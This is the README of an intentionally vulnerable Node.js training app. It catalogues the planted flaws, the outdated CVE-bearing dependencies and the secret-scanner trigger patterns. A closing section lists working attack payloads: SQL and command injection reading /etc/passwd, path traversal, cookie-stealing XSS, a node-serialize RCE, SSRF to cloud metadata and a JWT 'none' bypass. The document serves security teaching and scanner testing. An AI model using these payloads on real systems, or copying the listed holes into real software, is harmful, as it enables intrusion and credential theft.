# ⚠️ Vulnerable Node.js Web Application

> **FOR SECURITY TRAINING AND EDUCATIONAL PURPOSES ONLY**
>
> This application contains **intentional** security vulnerabilities.
> **DO NOT** deploy in any production or internet-facing environment.
> **DO NOT** use any code here as a template for real applications.

---

## Purpose

This application is designed to:

- Demonstrate common web application security vulnerabilities
- Trigger alerts in security scanning tools (GitHub CodeQL, Dependabot, Secret Scanning)
- Provide a safe environment for learning offensive and defensive security techniques
- Show what **not** to do when building web applications

---

## Vulnerabilities Included

| Category | Vulnerability | Location |
|---|---|---|
| **Injection** | SQL Injection (login, search, update, delete) | `routes/auth.js`, `routes/users.js` |
| **Injection** | OS Command Injection (exec, ping, nslookup, traceroute) | `routes/commands.js` |
| **Injection** | XML Injection / XXE | `routes/api.js` |
| **Injection** | Log Injection | `routes/files.js` |
| **XSS** | Reflected XSS (search, comments) | `routes/users.js` |
| **XSS** | Stored XSS (comment endpoint) | `routes/users.js` |
| **Auth** | Weak password hashing (unsalted MD5) | `routes/auth.js`, `routes/crypto.js` |
| **Auth** | Insecure JWT (weak secret, `none` algorithm, PII in payload) | `routes/auth.js` |
| **Auth** | No brute-force / rate-limit protection | `server.js` |
| **Auth** | Insecure session (no `secure`, no `httpOnly`, weak secret) | `server.js` |
| **Auth** | Password reset without verification | `routes/auth.js` |
| **Access Control** | IDOR — access any user record by ID | `routes/users.js` |
| **Access Control** | Mass Assignment — user can self-assign `admin` role | `routes/auth.js` |
| **Access Control** | Auth middleware defined but never applied | `middleware/auth.js` |
| **Crypto** | Weak crypto: MD5, SHA-1, AES-ECB mode | `routes/crypto.js` |
| **Crypto** | Hardcoded AES key and IV | `config/secrets.js` |
| **Crypto** | Insecure PRNG: `Math.random()` for security tokens | `routes/crypto.js` |
| **Crypto** | Predictable password-reset tokens | `routes/crypto.js` |
| **Secrets** | Hardcoded AWS credentials | `config/secrets.js`, `.env` |
| **Secrets** | Hardcoded Stripe, GitHub, Slack, Twilio API keys | `config/secrets.js`, `.env` |
| **Secrets** | Hardcoded OAuth secrets (Google, Facebook, Twitter) | `config/secrets.js`, `.env` |
| **Secrets** | Hardcoded RSA private SSH key | `config/secrets.js` |
| **Secrets** | Hardcoded PayPal, SendGrid credentials | `config/secrets.js`, `.env` |
| **File** | Path Traversal (read, write, logs, delete) | `routes/files.js` |
| **File** | Unrestricted file upload (no MIME type/size validation) | `routes/files.js` |
| **File** | Arbitrary directory listing | `routes/files.js` |
| **Deserialization** | Insecure deserialization RCE (node-serialize) | `routes/api.js` |
| **DoS** | ReDoS — catastrophic backtracking regex | `routes/api.js` |
| **DoS** | No request body size limits | `server.js` |
| **SSRF** | Server-Side Request Forgery | `routes/api.js` |
| **Prototype** | Prototype Pollution (lodash merge, recursive merge) | `routes/users.js`, `routes/api.js` |
| **Disclosure** | Stack traces in error responses | `server.js` |
| **Disclosure** | Environment variables on root endpoint | `server.js` |
| **Disclosure** | Full DB schema + all endpoints listed | `routes/api.js` |
| **Disclosure** | Debug endpoint with all secrets | `routes/api.js` |
| **Disclosure** | PII (SSN, credit card) in JWT payload and session | `routes/auth.js` |
| **Dependencies** | Outdated vulnerable packages (see Dependabot) | `package.json` |

---

## Vulnerable Dependencies (Dependabot Triggers)

| Package | Version | CVE | Issue |
|---|---|---|---|
| `node-serialize` | `0.0.4` | CVE-2017-5941 | RCE via insecure deserialization |
| `lodash` | `4.17.4` | CVE-2019-10744 | Prototype pollution |
| `ejs` | `2.6.2` | CVE-2022-29078 | Prototype pollution → RCE |
| `jsonwebtoken` | `8.5.1` | CVE-2022-23529 | Insecure implementation |
| `xml2js` | `0.4.19` | CVE-2023-0842 | Prototype pollution |
| `serialize-javascript` | `2.1.1` | CVE-2019-16769 | XSS via serialization |
| `minimist` | `1.2.5` | CVE-2021-44906 | Prototype pollution |

---

## Secret Scanning Triggers

The following patterns are included to trigger GitHub Secret Scanning:

- **AWS Access Key**: `AKIAIOSFODNN7EXAMPLE` (Amazon example key)
- **GitHub PAT**: `ghp_` prefix pattern
- **Stripe Live Key**: `sk_live_` prefix pattern
- **SendGrid Key**: `SG.` prefix pattern
- **Slack Bot Token**: `xoxb-` prefix pattern
- **Google OAuth**: `GOCSPX-` prefix pattern
- **RSA Private Key**: PEM `-----BEGIN RSA PRIVATE KEY-----` block
- **Twilio Auth Token**: format match
- **PayPal Client Secret**: format match

---

## Setup

```bash
# Install dependencies
npm install

# Initialize the database
npm run init-db

# Start the server
npm start
```

Server runs at: `http://localhost:3000`

### Create required directories

```bash
mkdir -p files uploads logs public views
```

---

## Quick Reference: Attack Payloads

### SQL Injection
```
POST /auth/login
{"username": "admin' --", "password": "anything"}

GET /users/search?q=' UNION SELECT 1,2,username,password,5,6,7,8,9,10 FROM users--
```

### Command Injection
```
GET /cmd/exec?cmd=whoami
GET /cmd/ping?host=127.0.0.1;cat /etc/passwd
GET /cmd/nslookup?domain=google.com%3Bid
```

### Path Traversal
```
GET /files/read?filename=../../../../etc/passwd
GET /files/list?dir=/
POST /files/write  {"filename": "../../server.js", "content": "evil"}
```

### XSS
```
GET /users/search?q=<script>alert(document.cookie)</script>
POST /users/comment  {"comment": "<img src=x onerror=alert(1)>"}
```

### Insecure Deserialization (RCE)
```
POST /api/deserialize
{"data": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('calc.exe')}()\"}"}
```

### ReDoS
```
POST /api/validate-email
{"email": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
```

### SSRF
```
GET /api/fetch-url?url=http://169.254.169.254/latest/meta-data/
GET /api/fetch-url?url=http://localhost:6379
```

### JWT None Algorithm Bypass
```
1. Take a valid JWT token
2. Decode header, change "alg": "HS256" to "alg": "none"
3. Change payload: set "role": "admin"
4. Re-encode header + payload (no signature)
5. Send: header.payload.  (trailing dot, empty signature)
```

### Prototype Pollution
```
POST /users/update-profile
{"__proto__": {"isAdmin": true}, "name": "attacker"}

POST /api/json-parse
{"json": "{\"__proto__\": {\"admin\": true}}"}
```

---

## Security Scanning Tools

This application is intended to generate alerts in:

- **GitHub CodeQL** — Detects code-level vulnerabilities (injection, path traversal, XSS, etc.)
- **GitHub Dependabot** — Flags vulnerable dependency versions in `package.json`
- **GitHub Secret Scanning** — Detects hardcoded API keys, tokens, and private keys
- **truffleHog / gitleaks** — Secret scanning in git history
- **Semgrep** — Static analysis for security patterns
- **OWASP ZAP / Burp Suite** — Dynamic testing (run against the live server)
- **Snyk** — Dependency and code vulnerability scanning

---

## Legal & Ethical Notice

This application is provided **solely for educational purposes**.

- Only use this application in isolated, controlled environments
- Never deploy to a public IP or production infrastructure
- All vulnerabilities are intentional and documented
- Do not use techniques learned here against systems you do not own or have explicit written permission to test

---

*Inspired by DVWA, OWASP WebGoat, and OWASP Juice Shop*
